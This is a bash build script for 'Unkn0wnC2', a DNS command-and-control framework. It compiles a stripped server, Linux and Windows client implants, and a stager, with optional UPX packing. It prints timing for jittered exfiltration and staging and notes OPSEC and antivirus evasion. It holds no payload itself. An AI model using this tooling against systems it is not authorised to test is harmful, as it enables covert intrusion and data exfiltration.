#!/bin/bash
#
# Production Build Script for Unkn0wnC2 DNS C2 Framework
# 
# This script builds optimized, stripped binaries for production deployment:
#   1. Embeds configuration from build_config.json into binaries
#   2. Builds server with production LDFLAGS (-s -w for stripping)
#   3. Builds Linux and Windows clients
#   4. Builds stager with configured jitter timing
#   5. Optional UPX compression for reduced binary size
#
# BEFORE RUNNING:
#   - Update build_config.json with your domain and network settings
#   - Change encryption_key from default value
#   - Review stager timing configuration for your OPSEC requirements
#
# USAGE:
#   bash build_production.sh
#
# OUTPUT:
#   All binaries will be in build/production/
#

set -e  # Exit on error

VERSION="0.1.0"
BUILD_DATE=$(date -u '+%Y-%m-%d_%H:%M:%S_UTC')
GIT_COMMIT=$(git rev-parse --short HEAD 2>/dev/null || echo "unknown")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${RED}"
cat << "EOF"
  _    _       _           ___                    _____ ___  
 | |  | |     | |         / _ \                  / ____|__ \ 
 | |  | |_ __ | | ___ __ | | | |_      ___ __   | |       ) |
 | |  | | '_ \| |/ / '_ \| | | \ \ /\ / / '_ \  | |      / / 
 | |__| | | | |   <| | | | |_| |\ V  V /| | | | | |____ / /_ 
  \____/|_| |_|_|\_\_| |_|\___/  \_/\_/ |_| |_|  \_____|____|
EOF
echo -e "${NC}"
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Production Build System${NC}"
echo -e "${GREEN}Version: ${VERSION}${NC}"
echo -e "${GREEN}================================${NC}"
echo ""

# Build flags for maximum optimization and minimal binary size
LDFLAGS="-s -w -X main.version=${VERSION} -X main.buildDate=${BUILD_DATE} -X main.gitCommit=${GIT_COMMIT}"
BUILDFLAGS="-trimpath"

# Create build directory
mkdir -p build/production

# Check if build_config.json exists
if [ ! -f "build_config.json" ]; then
    echo -e "${RED}Error: build_config.json not found${NC}"
    exit 1
fi

echo -e "${YELLOW}[1/6] Embedding configuration from build_config.json...${NC}"
# Only embed configuration into source files, don't build yet
cd tools/builder
go build -o ../../build-tool .
cd ../..

echo "  Running builder tool to embed configuration..."
# Note: Builder tool outputs binaries to build/ dir, but we'll rebuild with optimizations
./build-tool > /dev/null 2>&1

# Clean up builder's output since we'll rebuild with optimizations
rm -rf build/dns-server-linux build/dns-client-linux build/dns-client-windows.exe build/deployment_info.json 2>/dev/null || true

# Clean up build-tool
rm -f build-tool build-tool.exe
echo -e "${GREEN}✓ Configuration embedded into source files${NC}"
echo ""

echo -e "${YELLOW}[2/6] Building Server (Linux) with optimizations...${NC}"
cd Server
GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-server-linux .
echo -e "${GREEN}✓ Server built: $(du -h ../build/production/dns-server-linux | cut -f1)${NC}"
cd ..
echo ""

echo -e "${YELLOW}[3/6] Regenerating Client configuration...${NC}"
cd Client/tools
go run generate_config.go
cd ../..
echo -e "${GREEN}✓ Client config.go regenerated from build_config.json${NC}"
echo ""

echo -e "${YELLOW}[4/6] Building Client (Linux)...${NC}"
cd Client
GOOS=linux GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-client-linux .
echo -e "${GREEN}✓ Linux client built: $(du -h ../build/production/dns-client-linux | cut -f1)${NC}"
cd ..
echo ""

echo -e "${YELLOW}[5/6] Building Client (Windows)...${NC}"
cd Client
GOOS=windows GOARCH=amd64 go build ${BUILDFLAGS} -ldflags="${LDFLAGS}" -o ../build/production/dns-client-windows.exe .
echo -e "${GREEN}✓ Windows client built: $(du -h ../build/production/dns-client-windows.exe | cut -f1)${NC}"
cd ..
echo ""

echo -e "${YELLOW}[6/6] Building Stager (Linux) with jitter config...${NC}"
echo ""

# Show stager config being compiled
if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
    STAGER_JITTER_MIN=$(jq -r '.stager.jitter_min_ms // 100' build_config.json)
    STAGER_JITTER_MAX=$(jq -r '.stager.jitter_max_ms // 500' build_config.json)
    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst // 10' build_config.json)
    STAGER_BURST=$(jq -r '.stager.burst_pause_ms // 2000' build_config.json)
    RETRY_DELAY=$(jq -r '.stager.retry_delay_seconds // 3' build_config.json)
    MAX_RETRIES=$(jq -r '.stager.max_retries // 5' build_config.json)
    
    # Convert to seconds for display
    JITTER_MIN_S=$(( STAGER_JITTER_MIN / 1000 ))
    JITTER_MAX_S=$(( STAGER_JITTER_MAX / 1000 ))
    BURST_S=$(( STAGER_BURST / 1000 ))
    
    # Calculate total delay range (jitter + burst pause)
    TOTAL_MIN_S=$(( (STAGER_JITTER_MIN + STAGER_BURST) / 1000 ))
    TOTAL_MAX_S=$(( (STAGER_JITTER_MAX + STAGER_BURST) / 1000 ))
    
    # Calculate estimated download time for 100 chunks
    EXAMPLE_CHUNKS=100
    NUM_BURSTS=$(( (EXAMPLE_CHUNKS + STAGER_CHUNKS - 1) / STAGER_CHUNKS ))
    AVG_DELAY_MS=$(( (STAGER_JITTER_MIN + STAGER_JITTER_MAX) / 2 ))
    TOTAL_DELAY_MS=$(( NUM_BURSTS * (AVG_DELAY_MS + STAGER_BURST) ))
    EST_TIME_S=$(( (EXAMPLE_CHUNKS + TOTAL_DELAY_MS) / 1000 ))
    EST_MIN=$(( EST_TIME_S / 60 ))
    EST_SEC=$(( EST_TIME_S % 60 ))
    
    echo ""
    echo "  Stager Timing Configuration:"
    echo "  ────────────────────────────────────────"
    echo "  Jitter Range:        ${JITTER_MIN_S}s - ${JITTER_MAX_S}s"
    echo "  Chunks Per Burst:    ${STAGER_CHUNKS}"
    echo "  Burst Pause:         ${BURST_S}s"
    echo "  Total Delay/Burst:   ${TOTAL_MIN_S}s - ${TOTAL_MAX_S}s"
    echo "  Retry Delay:         ${RETRY_DELAY}s"
    echo "  Max Retries:         ${MAX_RETRIES}"
    echo "  Est. Download Time:  ${EST_MIN}m ${EST_SEC}s (100 chunks)"
fi

cd Stager
make clean > /dev/null 2>&1 || true

# Build stager silently (build.sh has its own verbose output)
if bash build.sh > /dev/null 2>&1; then
    # Copy from build directory (where build.sh puts it)
    if [ -f "../build/stager/stager-linux-x64" ]; then
        cp ../build/stager/stager-linux-x64 ../build/production/
        echo -e "${GREEN}✓ Stager built: $(du -h ../build/production/stager-linux-x64 | cut -f1)${NC}"
    else
        echo -e "${RED}✗ Stager binary not found at expected location${NC}"
        cd ..
        exit 1
    fi
else
    echo -e "${RED}✗ Stager build failed${NC}"
    cd ..
    exit 1
fi
cd ..

echo ""
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Optional: UPX Compression${NC}"
echo -e "${GREEN}================================${NC}"
if command -v upx &> /dev/null; then
    read -p "Apply UPX compression? (reduces size but may trigger AV) [y/N]: " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        echo "  Compressing binaries with UPX..."
        upx --lzma --best build/production/dns-client-linux 2>/dev/null || true
        upx --lzma --best build/production/dns-client-windows.exe 2>/dev/null || true
        upx --lzma --best build/production/stager-linux-x64 2>/dev/null || true
        echo -e "${GREEN}  ✓ UPX compression complete${NC}"
    else
        echo "  Skipping UPX compression (better for OPSEC)"
    fi
else
    echo "  UPX not found - skipping compression (install with: apt install upx-ucl)"
fi

echo ""
echo -e "${GREEN}================================${NC}"
echo -e "${GREEN}Production Build Complete!${NC}"
echo -e "${GREEN}================================${NC}"
echo ""
echo "Build artifacts in: build/production/"
echo ""
ls -lh build/production/
echo ""

# Show compiled configuration summary
if command -v jq &> /dev/null && [ -f "build_config.json" ]; then
    echo -e "${YELLOW}COMPILED CONFIGURATION SUMMARY:${NC}"
    echo "────────────────────────────────────────"
    echo ""
    echo "Server Configuration:"
    jq -r '.server | "  Domain:     \(.domain)\n  Bind:       \(.bind_addr):\(.bind_port)\n  NS Records: \(.ns1), \(.ns2)\n  Forward DNS: \(.forward_dns)"' build_config.json
    echo ""
    
    echo "Client Timing Configuration:"
    CLIENT_SLEEP_MIN=$(jq -r '.client.sleep_min' build_config.json)
    CLIENT_SLEEP_MAX=$(jq -r '.client.sleep_max' build_config.json)
    EXFIL_JITTER_MIN=$(jq -r '.client.exfil_jitter_min_ms' build_config.json)
    EXFIL_JITTER_MAX=$(jq -r '.client.exfil_jitter_max_ms' build_config.json)
    EXFIL_CHUNKS=$(jq -r '.client.exfil_chunks_per_burst' build_config.json)
    EXFIL_PAUSE=$(jq -r '.client.exfil_burst_pause_ms' build_config.json)
    
    EXFIL_JITTER_MIN_S=$(( EXFIL_JITTER_MIN / 1000 ))
    EXFIL_JITTER_MAX_S=$(( EXFIL_JITTER_MAX / 1000 ))
    EXFIL_PAUSE_S=$(( EXFIL_PAUSE / 1000 ))
    
    echo "  Check-in Interval:    ${CLIENT_SLEEP_MIN}s - ${CLIENT_SLEEP_MAX}s"
    echo "  Exfil Jitter:         ${EXFIL_JITTER_MIN_S}s - ${EXFIL_JITTER_MAX_S}s"
    echo "  Exfil Chunks/Burst:   ${EXFIL_CHUNKS}"
    echo "  Exfil Burst Pause:    ${EXFIL_PAUSE_S}s"
    echo ""
    
    echo "Stager Timing Configuration:"
    STAGER_MIN=$(jq -r '.stager.jitter_min_ms' build_config.json)
    STAGER_MAX=$(jq -r '.stager.jitter_max_ms' build_config.json)
    STAGER_CHUNKS=$(jq -r '.stager.chunks_per_burst' build_config.json)
    STAGER_BURST=$(jq -r '.stager.burst_pause_ms' build_config.json)
    
    STAGER_MIN_S=$(( STAGER_MIN / 1000 ))
    STAGER_MAX_S=$(( STAGER_MAX / 1000 ))
    STAGER_BURST_S=$(( STAGER_BURST / 1000 ))
    
    echo "  Jitter Range:         ${STAGER_MIN_S}s - ${STAGER_MAX_S}s"
    echo "  Chunks Per Burst:     ${STAGER_CHUNKS}"
    echo "  Burst Pause:          ${STAGER_BURST_S}s"
    echo ""
fi

echo -e "${YELLOW}⚠️  DEPLOYMENT CHECKLIST:${NC}"
echo "  [ ] Change encryption key from default"
echo "  [ ] Configure proper DNS delegation and glue records"
echo "  [ ] Review timing configurations for your OPSEC requirements"
echo "  [ ] Disable debug mode in production"
echo "  [ ] Test in isolated environment first"
echo ""
echo -e "${GREEN}Ready for deployment!${NC}"
